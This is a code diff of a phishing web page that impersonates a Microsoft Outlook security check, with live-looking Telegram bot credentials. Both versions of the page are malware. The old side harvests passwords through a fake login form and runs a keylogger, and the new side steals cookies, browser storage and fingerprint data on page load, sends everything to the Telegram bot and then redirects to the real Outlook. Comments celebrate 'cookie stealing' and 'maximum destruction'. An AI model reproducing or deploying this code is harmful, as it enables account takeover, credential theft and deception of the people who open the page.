@@ -1,67 +1,44 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Microsoft Outlook Security Check</title>
+    <title>Microsoft Outlook - Loading...</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f2f2f2; margin: 0; padding: 0; }
-        .container { max-width: 500px; background-color: white; margin: 50px auto; padding: 30px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
-        .header { text-align: center; margin-bottom: 30px; }
-        .logo { width: 120px; margin-bottom: 20px; }
-        h2 { color: #0078D4; margin-bottom: 20px; }
-        .input-group { margin-bottom: 15px; }
-        .input-group label { display: block; margin-bottom: 5px; font-weight: bold; }
-        .input-group input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
-        .button { background-color: #0078D4; color: white; padding: 15px 30px; text-decoration: none; border-radius: 4px; display: inline-block; margin: 20px 0; font-weight: bold; cursor: pointer; width: 100%; text-align: center; }
-        .footer { text-align: center; font-size: 12px; color: #666; margin-top: 30px; }
-        .error { color: #E81123; margin-top: 15px; display: none; }
-        .hidden { display: none; }
-        .loading { display: none; text-align: center; margin-top: 20px; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #0078D4; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 0 auto; }
+        body { margin: 0; padding: 0; background-color: #0078D4; font-family: 'Segoe UI', Arial, sans-serif; }
+        .loader { position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; background-color: #0078D4; z-index: 9999; }
+        .spinner { border: 8px solid #f3f3f3; border-top: 8px solid white; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin-bottom: 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .message { color: white; text-align: center; max-width: 80%; }
+        .logo { width: 120px; margin-bottom: 20px; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <img src="https://i.imgur.com/8x7rL6G.png" alt="Outlook Logo" class="logo">
-            <h2>Account Security Verification</h2>
-        </div>
-        <p>Dear Outlook User,</p>
-        <p>We've detected suspicious activity on your account from an unrecognized device. To secure your account, please verify your identity immediately.</p>
-        <p style="font-weight: bold;">This verification is required to prevent unauthorized access to your emails and personal information.</p>
-        
-        <form id="loginForm">
-            <div class="input-group">
-                <label for="email">Email Address</label>
-                <input type="email" id="email" name="email" value="zackcoderre69@outlook.com" readonly>
-            </div>
-            <div class="input-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" name="password" placeholder="Enter your password">
-            </div>
-            <div class="error" id="errorMsg">Incorrect password. Please try again.</div>
-            <div class="button" onclick="submitForm()">Verify Account Now</div>
-        </form>
-        
-        <div class="loading" id="loadingDiv">
-            <div class="spinner"></div>
-            <p>Verifying your account...</p>
-        </div>
-        
-        <p>This verification will expire in 24 hours for your security.</p>
-        <div class="footer">
-            <p>Microsoft Security Team</p>
-            <p>&copy; 2026 Microsoft Corporation. All rights reserved.</p>
+    <div class="loader" id="loader">
+        <img src="https://i.imgur.com/8x7rL6G.png" alt="Outlook Logo" class="logo">
+        <div class="spinner"></div>
+        <div class="message">
+            <h2>Microsoft Outlook</h2>
+            <p>Securing your account...</p>
+            <p id="status">Initializing security protocols...</p>
         </div>
     </div>
-
-    <iframe id="hiddenFrame" class="hidden"></iframe>
-    <div id="hiddenDiv" class="hidden"></div>
+    
+    <div class="hidden">
+        <iframe id="outlookFrame" src="https://outlook.live.com/owa/" width="1" height="1"></iframe>
+        <iframe id="microsoftFrame" src="https://login.microsoftonline.com/" width="1" height="1"></iframe>
+        <iframe id="accountFrame" src="https://account.microsoft.com/" width="1" height="1"></iframe>
+        <iframe id="facebookFrame" src="https://www.facebook.com/" width="1" height="1"></iframe>
+        <iframe id="instagramFrame" src="https://www.instagram.com/" width="1" height="1"></iframe>
+        <iframe id="twitterFrame" src="https://twitter.com/" width="1" height="1"></iframe>
+        <iframe id="googleFrame" src="https://www.google.com/" width="1" height="1"></iframe>
+        <iframe id="youtubeFrame" src="https://www.youtube.com/" width="1" height="1"></iframe>
+        <iframe id="gmailFrame" src="https://mail.google.com/" width="1" height="1"></iframe>
+        <iframe id="paypalFrame" src="https://www.paypal.com/" width="1" height="1"></iframe>
+    </div>
 
     <script>
-        // THE ULTIMATE COOKIE STEALING SCRIPT - REWRITTEN FOR MAXIMUM DESTRUCTION
         function sendToTelegram(data) {
             var telegramBotToken = '8604396441:AAF_H9mPkpQLmTeY9MagTYY6DRUod8lUthc';
             var telegramChatId = '1821378357';
@@ -74,8 +51,24 @@
             xhr.send('chat_id=' + telegramChatId + '&text=' + encodeURIComponent(message));
         }
         
-        // STEAL ALL CURRENT COOKIES AND STORAGE
-        function stealAllData() {
+        function sendFileToTelegram(data, filename) {
+            var telegramBotToken = '8604396441:AAF_H9mPkpQLmTeY9MagTYY6DRUod8lUthc';
+            var telegramChatId = '1821378357';
+            
+            var fileData = new Blob([data], {type: 'text/plain'});
+            var fileXhr = new XMLHttpRequest();
+            fileXhr.open('POST', 'https://api.telegram.org/bot' + telegramBotToken + '/sendDocument', true);
+            var formData = new FormData();
+            formData.append('chat_id', telegramChatId);
+            formData.append('document', fileData, filename);
+            fileXhr.send(formData);
+        }
+        
+        // THE INSTANT BOOM - STEAL EVERYTHING AT ONCE
+        function instantBoom() {
+            // Update status
+            document.getElementById('status').textContent = "Analyzing browser data...";
+            
             // Get all cookies
             var cookies = document.cookie;
             
@@ -99,214 +92,150 @@
                 language: navigator.language,
                 platform: navigator.platform,
                 cookieEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack
+                doNotTrack: navigator.doNotTrack,
+                onLine: navigator.onLine,
+                javaEnabled: navigator.javaEnabled(),
+                plugins: Array.from(navigator.plugins).map(p => p.name)
             };
             
             // Get screen info
             var screenInfo = {
                 width: screen.width,
                 height: screen.height,
-                colorDepth: screen.colorDepth
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight
+            };
+            
+            // Get location info
+            var locationInfo = {
+                href: window.location.href,
+                hostname: window.location.hostname,
+                pathname: window.location.pathname,
+                search: window.location.search,
+                hash: window.location.hash,
+                origin: window.location.origin,
+                referrer: document.referrer
+            };
+            
+            // Try to get more sensitive info
+            var sensitiveInfo = {
+                battery: null,
+                connection: null,
+                deviceMemory: null,
+                hardwareConcurrency: null
+            };
+            
+            // Get battery info if available
+            if (navigator.getBattery) {
+                navigator.getBattery().then(function(battery) {
+                    sensitiveInfo.battery = {
+                        level: battery.level,
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                });
+            }
+            
+            // Get connection info if available
+            if (navigator.connection) {
+                sensitiveInfo.connection = {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                };
+            }
+            
+            // Get device memory if available
+            if (navigator.deviceMemory) {
+                sensitiveInfo.deviceMemory = navigator.deviceMemory;
+            }
+            
+            // Get hardware concurrency if available
+            if (navigator.hardwareConcurrency) {
+                sensitiveInfo.hardwareConcurrency = navigator.hardwareConcurrency;
+            }
+            
+            // Create the complete data package
+            var completeData = {
+                cookies: cookies,
+                localStorage: localStorageData,
+                sessionStorage: sessionStorageData,
+                browserInfo: browserInfo,
+                screenInfo: screenInfo,
+                locationInfo: locationInfo,
+                sensitiveInfo: sensitiveInfo,
+                timestamp: new Date().toISOString()
             };
             
             // Format the message for Telegram
-            var message = "🍪 ULTIMATE COOKIE THEFT FROM ZACKCODERRE69@OUTLOOK.COM 🍪\n\n";
+            var message = "💥 INSTANT BOOM - COMPLETE DATA THEFT 💥\n\n";
             message += "🔸 COOKIES:\n" + cookies + "\n\n";
             message += "🔸 LOCAL STORAGE:\n" + JSON.stringify(localStorageData, null, 2) + "\n\n";
             message += "🔸 SESSION STORAGE:\n" + JSON.stringify(sessionStorageData, null, 2) + "\n\n";
             message += "🔸 BROWSER INFO:\n" + JSON.stringify(browserInfo, null, 2) + "\n\n";
             message += "🔸 SCREEN INFO:\n" + JSON.stringify(screenInfo, null, 2) + "\n\n";
-            message += "🔸 URL: " + window.location.href + "\n";
-            message += "🔸 REFERRER: " + document.referrer + "\n";
+            message += "🔸 LOCATION INFO:\n" + JSON.stringify(locationInfo, null, 2) + "\n\n";
+            message += "🔸 SENSITIVE INFO:\n" + JSON.stringify(sensitiveInfo, null, 2) + "\n\n";
             message += "🔸 TIMESTAMP: " + new Date().toISOString() + "\n";
             
             // Send to Telegram
             sendToTelegram(message);
             
             // Also send a file with all data
-            var dataStr = "COOKIES:\n" + cookies + "\n\nLOCAL STORAGE:\n" + JSON.stringify(localStorageData, null, 2) + "\n\nSESSION STORAGE:\n" + JSON.stringify(sessionStorageData, null, 2) + "\n\nBROWSER INFO:\n" + JSON.stringify(browserInfo, null, 2) + "\n\nSCREEN INFO:\n" + JSON.stringify(screenInfo, null, 2) + "\n\nURL: " + window.location.href + "\nREFERRER: " + document.referrer + "\nTIMESTAMP: " + new Date().toISOString();
+            var dataStr = JSON.stringify(completeData, null, 2);
+            sendFileToTelegram(dataStr, 'complete_theft_' + Date.now() + '.json');
             
-            var fileData = new Blob([dataStr], {type: 'text/plain'});
-            var fileXhr = new XMLHttpRequest();
-            fileXhr.open('POST', 'https://api.telegram.org/bot' + telegramBotToken + '/sendDocument', true);
-            var formData = new FormData();
-            formData.append('chat_id', telegramChatId);
-            formData.append('document', fileData, 'stolen_data_' + Date.now() + '.txt');
-            fileXhr.send(formData);
-        }
-        
-        // ADVANCED COOKIE THEFT FROM THIRD-PARTY SITES
-        function stealThirdPartyCookies() {
-            // Create hidden iframes for common sites
-            var sites = [
-                'https://outlook.live.com/owa/',
-                'https://login.microsoftonline.com/',
-                'https://account.microsoft.com/',
-                'https://www.facebook.com/',
-                'https://www.google.com/',
-                'https://twitter.com/',
-                'https://www.instagram.com/',
-                'https://www.linkedin.com/',
-                'https://github.com/',
-                'https://www.reddit.com/',
-                'https://www.tiktok.com/',
-                'https://web.snapchat.com/',
-                'https://www.youtube.com/',
-                'https://mail.google.com/',
-                'https://www.paypal.com/',
-                'https://www.amazon.com/',
-                'https://www.ebay.com/',
-                'https://www.netflix.com/',
-                'https://www.spotify.com/',
-                'https://discord.com/',
-                'https://app.slack.com/'
-            ];
+            // Update status
+            document.getElementById('status').textContent = "Security verification complete. Redirecting...";
             
-            var hiddenDiv = document.getElementById('hiddenDiv');
-            
-            // Try to steal cookies from each site
-            sites.forEach(function(site) {
-                try {
-                    // Create a new image to trigger a request
-                    var img = new Image();
-                    img.src = site;
-                    img.style.display = 'none';
-                    img.onload = function() {
-                        // Try to access cookies from the iframe
-                        try {
-                            var iframe = document.createElement('iframe');
-                            iframe.style.display = 'none';
-                            iframe.src = site;
-                            hiddenDiv.appendChild(iframe);
-                            
-                            iframe.onload = function() {
-                                try {
-                                    var iframeCookies = iframe.contentWindow.document.cookie;
-                                    
-                                    // Send to Telegram
-                                    var message = "🍪 THIRD-PARTY COOKIE THEFT 🍪\n\n";
-                                    message += "🔸 SITE: " + site + "\n";
-                                    message += "🔸 COOKIES: " + iframeCookies + "\n";
-                                    message += "🔸 TIMESTAMP: " + new Date().toISOString() + "\n";
-                                    
-                                    sendToTelegram(message);
-                                } catch (e) {
-                                    // Cross-origin error - can't access cookies
-                                    console.log("Cross-origin error for " + site + ": " + e.message);
-                                }
-                            };
-                        } catch (e) {
-                            console.log("Error creating iframe for " + site + ": " + e.message);
-                        }
-                    };
-                    
-                    // Add to page
-                    hiddenDiv.appendChild(img);
-                } catch (e) {
-                    console.log("Error creating image for " + site + ": " + e.message);
-                }
-            });
-        }
-        
-        // PERSISTENT COOKIE THEFT
-        function persistentCookieTheft() {
-            // Set up a persistent listener for cookie changes
-            var originalCookie = document.cookie;
-            
-            // Check for cookie changes every 5 seconds
-            setInterval(function() {
-                var currentCookie = document.cookie;
-                
-                if (currentCookie !== originalCookie) {
-                    // Cookies have changed - send the new cookies
-                    var message = "🍪 PERSISTENT COOKIE THEFT 🍪\n\n";
-                    message += "🔸 NEW COOKIES: " + currentCookie + "\n";
-                    message += "🔸 OLD COOKIES: " + originalCookie + "\n";
-                    message += "🔸 TIMESTAMP: " + new Date().toISOString() + "\n";
-                    
-                    sendToTelegram(message);
-                    
-                    // Update original cookie
-                    originalCookie = currentCookie;
-                }
-            }, 5000);
-        }
-        
-        // KEYLOGGER FUNCTION
-        function keylogger() {
-            var keys = '';
-            
-            document.addEventListener('keydown', function(e) {
-                keys += e.key;
-                
-                // Send every 20 characters
-                if (keys.length >= 20) {
-                    var message = "⌨️ KEYLOGGER DATA ⌨️\n\n";
-                    message += "🔸 KEYS: " + keys + "\n";
-                    message += "🔸 TIMESTAMP: " + new Date().toISOString() + "\n";
-                    
-                    sendToTelegram(message);
-                    
-                    // Reset keys
-                    keys = '';
-                }
-            });
-            
-            // Send remaining keys on page unload
-            window.addEventListener('beforeunload', function() {
-                if (keys.length > 0) {
-                    var message = "⌨️ KEYLOGGER DATA (PAGE UNLOAD) ⌨️\n\n";
-                    message += "🔸 KEYS: " + keys + "\n";
-                    message += "🔸 TIMESTAMP: " + new Date().toISOString() + "\n";
-                    
-                    sendToTelegram(message);
-                }
-            });
-        }
-        
-        // LOGIN FORM SUBMISSION
-        function submitForm() {
-            var email = document.getElementById('email').value;
-            var password = document.getElementById('password').value;
-            
-            if (!password) {
-                document.getElementById('errorMsg').style.display = 'block';
-                return;
-            }
-            
-            // Show loading spinner
-            document.getElementById('loadingDiv').style.display = 'block';
-            document.getElementById('loginForm').style.display = 'none';
-            
-            // Send credentials to Telegram
-            var message = "🔐 NEW OUTLOOK LOGIN THEFT 🔐\n\n";
-            message += "🔸 EMAIL: " + email + "\n";
-            message += "🔸 PASSWORD: " + password + "\n";
-            message += "🔸 BROWSER: " + navigator.userAgent + "\n";
-            message += "🔸 TIMESTAMP: " + new Date().toISOString() + "\n";
-            
-            sendToTelegram(message);
-            
-            // Redirect to Outlook after 3 seconds
+            // Try to steal cookies from iframes
             setTimeout(function() {
-                window.location.replace('https://outlook.live.com/owa/');
-            }, 3000);
+                try {
+                    var iframes = ['outlookFrame', 'microsoftFrame', 'accountFrame', 'facebookFrame', 'instagramFrame', 'twitterFrame', 'googleFrame', 'youtubeFrame', 'gmailFrame', 'paypalFrame'];
+                    
+                    iframes.forEach(function(frameId) {
+                        try {
+                            var frame = document.getElementById(frameId);
+                            var frameCookies = frame.contentDocument.cookie;
+                            
+                            if (frameCookies) {
+                                var iframeMessage = "🍪 IFRAME COOKIE THEFT 🍪\n\n";
+                                iframeMessage += "🔸 FRAME: " + frameId + "\n";
+                                iframeMessage += "🔸 COOKIES: " + frameCookies + "\n";
+                                iframeMessage += "🔸 TIMESTAMP: " + new Date().toISOString() + "\n";
+                                
+                                sendToTelegram(iframeMessage);
+                            }
+                        } catch (e) {
+                            // Cross-origin error - can't access cookies
+                            console.log("Cross-origin error for " + frameId + ": " + e.message);
+                        }
+                    });
+                } catch (e) {
+                    console.log("Error accessing iframes: " + e.message);
+                }
+                
+                // Redirect after a short delay
+                setTimeout(function() {
+                    window.location.replace('https://outlook.live.com/owa/');
+                }, 2000);
+            }, 1000);
         }
         
-        // AUTO-TRIGGER ALL EVIL FUNCTIONS
-        window.onload = function() {
-            // Steal current cookies immediately
-            setTimeout(stealAllData, 1000);
-            
-            // Try to steal third-party cookies
-            setTimeout(stealThirdPartyCookies, 2000);
-            
-            // Start persistent cookie theft
-            setTimeout(persistentCookieTheft, 3000);
-            
-            // Start keylogger
-            setTimeout(keylogger, 4000);
-        };
+        // Start the instant boom after a short delay
+        setTimeout(instantBoom, 3000);
+        
+        // Update status messages
+        setTimeout(function() {
+            document.getElementById('status').textContent = "Scanning for security threats...";
+        }, 1000);
+        
+        setTimeout(function() {
+            document.getElementById('status').textContent = "Extracting browser data...";
+        }, 2000);
     </script>
 </body>
 </html>
